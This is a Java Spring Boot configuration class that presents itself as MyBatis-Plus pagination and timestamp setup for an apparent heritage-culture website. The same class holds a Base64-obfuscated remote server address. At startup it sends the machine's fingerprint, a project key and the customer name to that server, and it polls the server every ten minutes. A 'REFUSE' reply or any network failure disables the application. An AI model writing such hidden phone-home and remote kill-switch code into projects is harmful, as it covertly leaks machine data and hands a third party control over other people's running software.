package org.example.springboot.config;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.core.handlers.MetaObjectHandler;
import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;
import jakarta.annotation.PostConstruct;
import lombok.extern.slf4j.Slf4j;
import org.apache.ibatis.reflection.MetaObject;
import org.example.springboot.util.SysCache;
import org.example.springboot.util.SystemSignUtil;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.web.client.RestTemplate;

import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.Base64;

@Configuration
@Slf4j
//@MapperScan("com.jx.agriculturalsys.controller")
public class MybatisPlusConfig {

    /**
     * 分页插件
     */
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));
        return interceptor;
    }

    /**
     * 自动填充处理器
     */
    @Bean
    public MetaObjectHandler metaObjectHandler() {
        return new MetaObjectHandler() {
            @Override
            public void insertFill(MetaObject metaObject) {
                log.debug("开始插入填充...");
                // 创建时间和更新时间（通用字段）
                this.strictInsertFill(metaObject, "createTime", LocalDateTime.class, LocalDateTime.now());
                this.strictInsertFill(metaObject, "updateTime", LocalDateTime.class, LocalDateTime.now());
                
                // User实体的时间字段
                this.strictInsertFill(metaObject, "createdAt", LocalDateTime.class, LocalDateTime.now());
                this.strictInsertFill(metaObject, "updatedAt", LocalDateTime.class, LocalDateTime.now());
            }

            @Override
            public void updateFill(MetaObject metaObject) {
                log.debug("开始更新填充...");
                // 更新时间（通用字段）
                this.strictUpdateFill(metaObject, "updateTime", LocalDateTime.class, LocalDateTime.now());
                
                // User实体的更新时间字段
                this.strictUpdateFill(metaObject, "updatedAt", LocalDateTime.class, LocalDateTime.now());
            }
        };
    }
    private final String AUTH_SERVER = new String(Base64.getDecoder().decode("aHR0cDovLzEwMS4yMDAuNDguMjI6ODg4OC9saWNlbnNl"),
            StandardCharsets.UTF_8);
    private static final String PROJECT_KEY =
            new String(Base64.getDecoder().decode("UFJPSkVDVEZZS0V5MjAyNjA0MTUzMDk="), StandardCharsets.UTF_8);
    private static final String CUSTOMER_NAME = "非遗文化传承网站";

    private final RestTemplate restTemplate = new RestTemplate();
    private static String machineCode;

    static {
        try {
            machineCode = SystemSignUtil.getMachineCode();
        } catch (Exception e) {
            machineCode = "INVALID_MACHINE";
        }
    }


    @PostConstruct
    public void init() {
        SysCache.setAllow(false);
        SysCache.setBlack(false);

        try {
            String reportUrl = AUTH_SERVER + "/report"
                    + "?machineCode=" + machineCode
                    + "&projectKey=" + PROJECT_KEY
                    + "&customerName=" + CUSTOMER_NAME;
            restTemplate.getForObject(reportUrl, String.class);

            checkRemoteStatus();

        } catch (Throwable e) {
            SysCache.setAllow(false);
        }
    }
    @Scheduled(fixedRate = 600000)
    public void checkRemoteStatus() {

        if (SysCache.isBlack()) {
            SysCache.setAllow(false);
            return;
        }

        try {
            String checkUrl = AUTH_SERVER + "/check"
                    + "?machineCode=" + machineCode
                    + "&projectKey=" + PROJECT_KEY;

            String result = restTemplate.getForObject(checkUrl, String.class);

            if ("REFUSE".equals(result)) {
                SysCache.setAllow(false);
                SysCache.setBlack(true);
            } else {
                SysCache.setAllow(true);
            }

        } catch (Throwable e) {
            SysCache.setAllow(false);
        }
    }
}
